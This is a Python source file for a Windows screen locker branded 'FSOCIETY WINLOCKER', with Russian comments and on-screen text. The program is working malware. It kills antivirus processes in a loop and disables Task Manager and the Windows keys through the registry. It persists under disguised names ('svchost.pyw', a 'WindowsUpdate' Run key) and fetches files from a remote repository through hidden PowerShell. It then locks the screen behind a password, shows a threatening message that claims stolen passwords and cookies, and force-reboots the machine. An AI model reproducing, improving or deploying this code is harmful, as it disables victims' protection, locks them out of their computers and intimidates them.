# ============================================================
# FSOCIETY WINLOCKER v8.0 — PYTHON
# ============================================================
import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk

# АВТОУСТАНОВКА БИБЛИОТЕК
for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
    try: __import__(lib)
    except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

import cv2, pygame, keyboard, numpy as np

# КОНФИГ
PASS = "1601"
TRIES = 5
HOURS = 1
TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
T = tempfile.gettempdir()
V = os.path.join(T, "v.mp4")
M = os.path.join(T, "m.mp3")
tries = TRIES

# СКАЧИВАНИЕ
def dl(url, path):
    if os.path.exists(path) and os.path.getsize(path) > 10000: return True
    try:
        urllib.request.urlretrieve(url, path)
        if os.path.getsize(path) > 10000: return True
    except: pass
    try:
        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
        if os.path.getsize(path) > 10000: return True
    except: pass
    return False

# АНТИВИРУС
def kill_av():
    avs = ["avast","avg","avira","bitdefender","kaspersky","mcafee","norton","eset","drweb","msmpeng","nis","bdagent","avp","MsMpEng","NisSrv","Sophos","Windefend","Defender"]
    while True:
        for av in avs:
            try: os.system(f"taskkill /f /im {av}.exe >nul 2>&1")
            except: pass
        time.sleep(0.1)

# БЛОКИРОВКА КЛАВИШ
def lock_keys():
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,1); winreg.CloseKey(r)
            except: pass
    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
        try: keyboard.block_key(k)
        except: pass
    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
        try: keyboard.add_hotkey(c, lambda:0, suppress=True)
        except: pass

def unlock_keys():
    try: keyboard.unhook_all()
    except: pass
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,0); winreg.CloseKey(r)
            except: pass

# ТАЙМЕР
def timer_save():
    end = time.time() + HOURS*3600
    os.makedirs(os.path.dirname(TIMER), exist_ok=True)
    with open(TIMER,'w') as f: f.write(str(end))
    return end

def timer_get():
    try:
        with open(TIMER) as f: return float(f.read())
    except: return timer_save()

def timer_check():
    while True:
        if timer_get() - time.time() <= 0: destroy()
        time.sleep(5)

def destroy():
    os.system("shutdown /r /t 0 /f")
    os._exit(0)

# АВТОЗАГРУЗКА
def startup():
    s = os.path.abspath(sys.argv[0])
    d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
    try: shutil.copy2(s,d)
    except: pass
    pw = sys.executable.replace("python.exe","pythonw.exe")
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            r=winreg.OpenKey(h,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(r,"WindowsUpdate",0,winreg.REG_SZ,f'"{pw}" "{s}"')
            winreg.CloseKey(r)
        except: pass

# АНИМАЦИЯ
def anim():
    a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
    a.configure(bg='black'); a.overrideredirect(True)
    l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        l.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    s=tk.Label(a,text="",bg='black',fg='#ff4444',font=('Courier',22)); s.pack(pady=20)
    for i in range(len("тебя приветствует")+1):
        s.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

# ВИДЕО
def video():
    if not dl(VIDEO_URL,V): return
    try:
        pygame.mixer.init(); pygame.mixer.music.load(V); pygame.mixer.music.play()
    except: pass
    try:
        cap=cv2.VideoCapture(V)
        if not cap.isOpened(): return
        fps=cap.get(cv2.CAP_PROP_FPS) or 30
        cv2.namedWindow("FSOCIETY",cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("FSOCIETY",cv2.WND_PROP_FULLSCREEN,cv2.WINDOW_FULLSCREEN)
        while cap.isOpened():
            ret,frame=cap.read()
            if not ret: break
            cv2.imshow("FSOCIETY",frame); cv2.waitKey(int(1000/fps))
        cap.release(); cv2.destroyAllWindows()
        for _ in range(5): cv2.waitKey(1)
    except: pass
    try: pygame.mixer.music.stop()
    except: pass

# ВИНЛОКЕР
class Locker:
    def __init__(self):
        global tries
        self.r=tk.Tk(); self.r.withdraw()
        self.w=tk.Toplevel(self.r)
        self.w.attributes('-fullscreen',True); self.w.attributes('-topmost',True)
        self.w.configure(bg='black'); self.w.overrideredirect(True)
        self.w.protocol("WM_DELETE_WINDOW",lambda:None)
        self.w.bind("<Alt-F4>",lambda e:None); self.w.bind("<Escape>",lambda e:None)
        self.w.focus_force()
        self.end=timer_get()
        self.tl=tk.Label(self.w,text="",bg='black',fg='#ff4444',font=('Courier',30,'bold'))
        self.tl.place(relx=0.5,rely=0.08,anchor='center')
        self.tick()
        try:
            if dl(MUSIC_URL,M):
                pygame.mixer.init(); pygame.mixer.music.load(M)
                pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
        except: pass
        msg=f"""Вот чего доводит интернет.

Вот смотри, ты скачивал игры
или что там из интернета?
Вот доскачался. Сиди и жуй мой винлокер.

Ты хочешь перезагрузить ПК?
У тебя не получится.
ПК перезагрузить получится,
но избавиться от меня - нет.
Я везде. Я в твоём роутере.
Я знаю все твои данные.
У меня есть cookies файлы,
пароли, логины, почты и т.д.

МЫ FSOCIETY.
YOU FUCK.

ПОПЫТОК: {TRIES}"""
        tk.Label(self.w,text=msg,bg='black',fg='white',font=('Courier',11,'bold'),justify='center').place(relx=0.5,rely=0.45,anchor='center')
        cf=tk.Frame(self.w,bg='black'); cf.place(relx=0.5,rely=0.82,anchor='center')
        tk.Label(cf,text="ВВЕДИ ПАРОЛЬ:",bg='black',fg='#00ff00',font=('Courier',14,'bold')).pack(pady=(0,5))
        self.e=tk.Entry(cf,show="*",font=('Courier',14,'bold'),bg='#111',fg='#00ff00',relief='solid',bd=2)
        self.e.pack(pady=(0,5),ipadx=40,ipady=3)
        self.sl=tk.Label(cf,text=f"ОСТАЛОСЬ: {tries}",bg='black',fg='yellow',font=('Courier',12,'bold'))
        self.sl.pack()
        self.e.bind('<Return>',self.chk); self.e.focus_force()
        self.w.after(100,self.focus)
    
    def tick(self):
        r=self.end-time.time()
        if r<=0: destroy()
        h,m,s=int(r//3600),int((r%3600)//60),int(r%60)
        self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.w.after(1000,self.tick)
    
    def focus(self):
        try: self.w.focus_force(); self.e.focus_force(); self.w.after(100,self.focus)
        except: pass
    
    def chk(self,e=None):
        global tries
        if self.e.get()==PASS:
            try: pygame.mixer.music.stop()
            except: pass
            unlock_keys()
            self.sl.config(text="ВЕРНО!",fg='white'); self.w.update()
            try: os.remove(TIMER)
            except: pass
            time.sleep(1); self.r.destroy(); os._exit(0)
        else:
            tries-=1
            if tries>0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}",fg='white')
            else:
                try: pygame.mixer.music.stop()
                except: pass
                self.sl.config(text="404 | ОШИБКА",fg='white'); self.w.update()
                time.sleep(2); destroy()
            self.e.delete(0,tk.END)

if __name__=="__main__":
    threading.Thread(target=kill_av,daemon=True).start()
    threading.Thread(target=timer_check,daemon=True).start()
    startup()
    anim()
    lock_keys()
    video()
    Locker()
    tk.mainloop()
